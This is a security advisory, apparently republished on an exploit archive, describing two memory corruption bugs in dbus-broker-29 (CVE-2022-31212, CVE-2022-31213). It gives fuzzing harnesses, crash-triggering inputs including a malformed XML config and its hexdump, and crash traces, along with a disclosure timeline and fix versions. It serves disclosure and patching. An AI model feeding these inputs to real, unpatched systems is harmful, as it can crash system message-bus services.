@@ -1,0 +1,297 @@
+id: 37773
+date: 06/07/2022
+title: dbus-broker-29 Memory Corruption Exploit
+author: Tim Weber
+cves: CVE-2022-31212, CVE-2022-31213
+
+=======================================================================
+               title: Multiple Memory Corruption Vulnerabilities
+             product: dbus-broker
+  vulnerable version: dbus-broker-29
+       fixed version: dbus-broker-31
+          CVE number: CVE-2022-31212, CVE-2022-31213
+              impact: medium
+            homepage: https://github.com/bus1/dbus-broker
+               found: 2022-01-14
+                  by: S. Robertz (Office Vienna)
+                      G. Hechenberger (Office Vienna)
+                      T. Weber (Office Vienna)
+                      T. Longin (Office Vienna)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"The dbus-broker project is an implementation of a message bus as defined by
+the D-Bus specification. Its aim is to provide high performance and
+reliability, while keeping compatibility to the D-Bus reference implementation.
+It is exclusively written for Linux systems, and makes use of many modern
+features provided by recent linux kernel releases."
+
+Source: https://github.com/bus1/dbus-broker
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Stack-Buffer Over-Read (CVE-2022-31212)
+Dbus-Broker depends on c-uitl/c-shquote to parse DBus service's Exec line.
+c-shquote contains a stack buffer over-read if a malicious Exec line is
+supplied.
+
+2) Null Pointer Dereference (CVE-2022-31213)
+Multiple Null Pointer references can be found when supplying a malformed XML
+config file.
+
+
+Proof of concept:
+-----------------
+1) Stack-Buffer Over-Read (CVE-2022-31212)
+Following harness was used to fuzz the function c_shquote_parse_argv() as
+it is used in src/launch/launcher.c of dbus-broker.
+
+------------------------------------------------------
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+#include "c-shquote.h"
+
+#define SIZE_65KB 66560
+
+int main(int argc, char** argv) {
+   char fuzz_buf[SIZE_65KB] = "";
+   ssize_t fuzz_len = read(STDIN_FILENO, fuzz_buf, SIZE_65KB);
+   char **out_argv;
+   ssize_t out_argc;
+   c_shquote_parse_argv(&out_argv, &out_argc, fuzz_buf, strlen(fuzz_buf));
+   return 0;
+}
+----------------------------------------------------------
+
+Passing \xff to the STDIN of the testharness will cause following crash:
+
+----------------------------------------------------------
+==21744==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff98c675bf at pc
+0x558e29cacc02 bp 0x7fff98c67490 sp 0x7fff98c67488
+READ of size 1 at 0x7fff98c675bf thread T0
+#0 0x558e29cacc01 in c_shquote_strncspn c-shquote/src/c-shquote.c:119:21
+#1 0x558e29caff15 in c_shquote_parse_next c-shquote/src/c-shquote.c:540:31
+#2 0x558e29cb09c2 in c_shquote_parse_argv c-shquote/src/c-shquote.c:620:21
+#3 0x558e29cab7e9 in c-shquote/src/argv_parser.c:23:2
+#4 0x7f07953a8b24 in __libc_start_main (/usr/lib/libc.so.6+0x27b24)
+#5 0x558e29bca15d in _start (c-shquote/src/harness_argv_parser+0x2015d)
+Address 0x7fff98c675bf is located in stack of thread T0 at offset 287 in frame
+#0 0x558e29cac54f in c_shquote_strncspn c-shquote/src/c-shquote.c:102
+This frame has 1 object(s):
+[32, 287) 'buffer' (line 103) <== Memory access at offset 287 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism,
+swapcontext or vfork
+(longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow c-shquote/src/c-shquote.c:119:21 in
+c_shquote_strncspn
+Shadow bytes around the buggy address:
+0x100073184e60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0x100073184e70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0x100073184e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0x100073184e90: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00
+0x100073184ea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x100073184eb0: 00 00 00 00 00 00 00[07]f3 f3 f3 f3 f3 f3 f3 f3
+0x100073184ec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0x100073184ed0: 00 00 00 00 f1 f1 f1 f1 00 f2 f2 f2 00 f2 f2 f2
+0x100073184ee0: 00 f2 f2 f2 00 f3 f3 f3 00 00 00 00 00 00 00 00
+0x100073184ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0x100073184f00: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 f2 f2 f2
+Shadow byte legend (one shadow byte represents 8 application bytes):
+Addressable: 00
+Partially addressable: 01 02 03 04 05 06 07
+Heap left redzone: fa
+Freed heap region: fd
+Stack left redzone: f1
+Stack mid redzone: f2
+Stack right redzone:f3
+Stack after return:  f5
+Stack use after scope: f8
+Global redzone: f9
+Global init order: f6
+Poisoned by user: f7
+Container overflow: fc
+Array cookie: ac
+Intra object redzone: bb
+ASan internal: fe
+Left alloca redzone: ca
+Right alloca redzone: cb
+==21744==ABORTING
+------------------------------------------------------
+
+The error occurs in the functions  c_shquote_strnspn() and c_shquote_strncspn().
+Both allocate a buffer like this:
+
+bool buffer[UCHAR_MAX] = {};
+
+UCHAR_MAX is defined in the C standard header limits.h and equals 255. Thus,
+array indexes of 0-254 can be addressed.
+
+However, the buffer will then be accessed like this:
+buffer[(unsigned char)string[i]], where string is the commandline from STDIN
+(or the EXEC line in case of dbus-broker services).
+Passing \xff will thus read an out of bounds array element.
+
+
+2) Null Pointer Dereference (CVE-2022-31213)
+The dbus-broker config parser uses the expat library to parse XML files.
+
+<limit name="max_pendingonment"/> is a valid XML line. Thus expat will parse
+it correctly. As no value is supplied in the statement, the
+limit_max_pendingonment parameter will contain a Null pointer. DBus-broker does
+not validate the result and tries to dereference the field, causing a crash.
+Multiple other XML edge case can be found that cause the expat library to
+correctly return a Null pointer, but are not handled correctly by the
+dbus-broker.
+
+Including <limit name="max_pendingonment"/>  causes following error message:
+-------------------------
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff782474a in ____strtoull_l_internal () from /lib64/libc.so.6
+Missing separate debuginfos, use: yum debuginfo-install expat-2.2.5-4.el8.x86_64 libblkid-
+2.32.1-28.el8.x86_64 libcap-2.26-5.el8.x86_64 libgcc-8.5.0-4.el8_5.x86_64 libmount-2.32.1-
+28.el8.x86_64 libselinux-2.9-5.el8.x86_64 libuuid-2.32.1-28.el8.x86_64 pcre2-10.32-
+2.el8.x86_64 sssd-client-2.5.2-2.el8_5.1.x86_64 systemd-libs-239-51.el8.x86_64
+(gdb) bt
+#0 0x00007ffff782474a in ____strtoull_l_internal () from /lib64/libc.so.6
+#1 0x000000000040cf0a in util_strtou64 (valp=valp@entry=0x828bc8, string=0x0) at
+../src/util/string.c:42
+#2 0x0000000000408f07 in config_parser_end_fn (userdata=0x7fffffffdf58, name=0x82278c
+"limit") at ../src/launch/config.c:1140
+#3 0x00007ffff7ba100f in doContent () from /lib64/libexpat.so.1
+#4 0x00007ffff7ba20c0 in contentProcessor () from /lib64/libexpat.so.1
+#5 0x00007ffff7ba480c in XML_ParseBuffer () from /lib64/libexpat.so.1
+#6 0x000000000040425f in config_parser_include (parser=0x7fffffffdf50, root=0x0,
+node=<optimized out>, nss_cache=0x7fffffffdf30, dirwatch=0x8192a0) at
+../src/launch/config.c:1289
+#7 config_parser_read (parser=parser@entry=0x7fffffffdf50, rootp=rootp@entry=0x7fffffffdf28,
+path=<optimized out>, nss_cache=nss_cache@entry=0x7fffffffdf30, dirwatch=0x8192a0) at
+../src/launch/config.c:1347
+#8 0x0000000000402c02 in main (argc=<optimized out>, argv=0x7fffffffe098) at
+../src/launch/harness-config.c:24
+-------------------------
+
+
+Following harness was used:
+
+-------------------------
+#include <c-list.h>
+#include <c-stdaux.h>
+#include <stdlib.h>
+#include "launch/config.h"
+#include "launch/nss-cache.h"
+#include "util/dirwatch.h"
+
+int main(int argc, char **argv) {
+_c_cleanup_(config_parser_deinit) ConfigParser parser = CONFIG_PARSER_NULL(parser);
+_c_cleanup_(config_root_freep) ConfigRoot *rootp = NULL;
+_c_cleanup_(nss_cache_deinit) NSSCache nss_cache = NSS_CACHE_INIT;
+_c_cleanup_(dirwatch_freep) Dirwatch *dirwatch = NULL;
+int r;
+r = dirwatch_new(&dirwatch);
+config_parser_init(&parser);
+r = config_parser_read(&parser, &rootp, argv[1], &nss_cache, dirwatch);
+return 0;
+}
+-------------------------
+
+
+Following config file will cause another error:
+-------------------------
+00000000: 3c21 2d2d 202d 2d3e 0a0a 3c21 444f 4354  <!-- -->..<!DOCT
+00000010: 5950 4520 6720 5055 424c 4943 2022 2d2f  YPE g PUBLIC "-/
+00000020: 4e22 0a20 2268 7474 223e 0a3c 6275 7363  N". "htt">.<busc
+00000030: 6f6e 6669 673e 0a0a 203c 7479 7065 3e73  onfig>.. <type>s
+00000040: 643c 2f74 7970 653e 3c66 6f72 6b2f 3e0a  d</type><fork/>.
+00000050: 203c 7374 616e 6461 7264 5f73 7973 e803   <standard_sys..
+00000060: 6d5f 7365 7276 6963 6564 6972 732f 3e0a  m_servicedirs/>.
+00000070: 203c 7365 7276 6963 6564 6972 2072 6563   <servicedir rec
+00000080: 6569 7665 5f74 7970 653d 2265 7272 6f72  eive_type="error
+00000090: 222f 3e0a 3c61 6c6c 6f77 2072 6563 6569  "/>.<allow recei
+000000a0: 7665 5f74 7970 653d 2273 6967 6e61 6c22  ve_type="signal"
+000000b0: 2f3e 2d3e 203c 616c 6c6f 7720 7365 6e64  />-> <allow send
+000000c0: 5f64 6573 7469 6e61 7469 6f6e 3d22 220a  _destination="".
+000000d0: 2020 2073 656e 645f 696e 7465 7266 6163     send_interfac
+000000e0: 653d 2222 202f 3e0a 3c61 6c6c 6f77 2073  e="" />.<allow s
+000000f0: 656e 645f 6465 7374 696e 617d 696f 6e3d  end_destina}ion=
+00000100: 2222 0a20 2020 7365 6e64 5f69 6e74 6572  "".   send_inter
+00000110: 6661 6365 3d22 6f72 6522 2f3e 203c 212d  face="ore"/> <!-
+00000120: 2d20 2d2d 3e20 3c64 656e 7920 7365 6e64  - --> <deny send
+00000130: 5f64 6573 74                             _dest
+-------------------------
+
+The error is following:
+-------------------------
+id:000047,sig:11,src:000356+000302,time:4820049,execs:17106488,op:splice,rep:4
+Unknown element in /fuzzing_Data/dbus-broker-config/out/harness-config2--
+/crashes/id:000047,sig:11,src:000356+000302,time:4820049,execs:17106488,op:splice,rep:4 +8:
+standard_sysm_servicedirs
+Unknown attribute in /fuzzing_Data/dbus-broker-config/out/harness-config2--
+/crashes/id:000047,sig:11,src:000356+000302,time:4820049,execs:17106488,op:splice,rep:4 +9:
+receive_type="error"
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff789dc95 in __strlen_avx2 () from /lib64/libc.so.6
+#0 0x00007ffff789dc95 in __strlen_avx2 () from /lib64/libc.so.6
+#1 0x00007ffff78714e2 in strdup () from /lib64/libc.so.6
+#2 0x0000000000408e96 in config_parser_end_fn (userdata=0x7fffffffdf48, name=0x81b45c
+"servicedir") at ../src/launch/config.c:1130
+#3 0x00007ffff7ba100f in doContent () from /lib64/libexpat.so.1
+#4 0x00007ffff7ba20c0 in contentProcessor () from /lib64/libexpat.so.1
+#5 0x00007ffff7b9fb6b in doProlog () from /lib64/libexpat.so.1
+#6 0x00007ffff7ba0a5f in prologProcessor () from /lib64/libexpat.so.1
+#7 0x00007ffff7ba480c in XML_ParseBuffer () from /lib64/libexpat.so.1
+#8 0x000000000040425f in config_parser_include (parser=0x7fffffffdf40, root=0x0,
+node=<optimized out>, nss_cache=0x7fffffffdf20, dirwatch=0x8192a0) at
+../src/launch/config.c:1289
+#9 config_parser_read (parser=parser@entry=0x7fffffffdf40, rootp=rootp@entry=0x7fffffffdf18,
+path=<optimized out>, nss_cache=nss_cache@entry=0x7fffffffdf20, dirwatch=0x8192a0) at
+../src/launch/config.c:1347
+#10 0x0000000000402c02 in main (argc=<optimized out>, argv=0x7fffffffe088) at
+../src/launch/harness-config.c:24
+-------------------------
+
+
+
+Vulnerable / tested versions:
+-----------------------------
+The Git Master branch (dbus-broker-29) has been tested and found to be
+vulnerable (tested at commit 727bee57cd3e3b5806eb8599abbdd49984b75732).
+
+Furthermore, it also contains the vulnerable c-shquote library (tested
+at commit 83ccc2893385fcca1424b188f0f6c45a62f2b38d).
+
+
+Vendor contact timeline:
+------------------------
+2022-04-01: Contacting vendor email.
+2022-04-04: Sending advisory via unencrypted email.
+2022-04-19: Bugs are fixed. New version will be released 2022-04-20.
+2022-05-10: dbus-broker-30 released.
+2022-05-16: dbus-broker-31 released with further fixes.
+2022-06-02: Release of security advisory.
+
+
+Solution:
+---------
+Update to the latest version. The vendor provides an updated version v30.
+v31 is available now which should be used as other introduced bugs have been
+fixed there:
+
+https://github.com/bus1/dbus-broker/releases/tag/v31
+
+#  0day.today [2023-03-24]  #
